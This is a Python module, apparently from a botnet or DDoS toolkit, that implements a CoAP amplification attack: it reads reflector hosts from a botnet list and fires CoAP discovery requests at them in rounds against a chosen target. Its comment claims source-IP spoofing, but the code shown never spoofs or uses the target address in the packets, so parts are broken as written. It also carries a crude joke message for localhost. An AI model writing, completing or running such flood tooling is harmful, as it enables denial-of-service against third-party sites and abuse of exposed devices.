#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, time
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy import *
except:
    print("\nError importing: scapy lib.\n")
    sys.exit(2)

# CBT CoAP Amplification (COAP)
def sIP(coaps):
    try:
        coap = random.choice(coaps)
        if coap.startswith('http://'):
            coap = coap.replace('http://','')
        elif coap.startswith('https://'):
            coap = coap.replace('https://','')
        try:
            ip = socket.gethostbyname(coap)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(coap)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = None
        return ip
    except:
        return None

def coapize(ip, port, rounds):
    f = open('botnet/coaps.txt')
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_coap_ip = sIP(base_stations)
            if s_coap_ip == None:
                print("[Error] [AI] [COAP] Impossible to retrieve 'base stations' -> [Aborting!]\n")
                break
            # CoAP GET request with large URI for amplification
            # CoAP header: Version(2) + Type(0=CON) + Token Length(0) + Code(1=GET) + Message ID
            coap_header = b'\x40\x01'  # Version=1, Type=CON, TKL=0, Code=GET
            coap_header += b'\x00\x00'  # Message ID (random)
            # Large URI path for amplification
            coap_uri = b'/.well-known/core?rt=*'
            payload = coap_header + coap_uri
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                # Spoof source IP to target
                sock.sendto(payload, (s_coap_ip, 5683))
                print("[Info] [AI] [COAP] Redirecting 'base station' ["+str(n)+"] ["+str(s_coap_ip)+"] -> [AMPLIFYING!]")
                time.sleep(0.1)
                sock.close()
            except:
                print("[Error] [AI] [COAP] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_coap_ip)+"]")
    except:
        print("[Error] [AI] [COAP] Failing to engage... -> Is still target online? -> [Checking!]")

class COAP(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] CoAP Amplification (COAP) is ready to fire: [" , rounds, "amplification pulses ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            port = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4']
                url = urlparse(target)
                a = r.query(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [COAP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        coapize(ip, port, rounds)
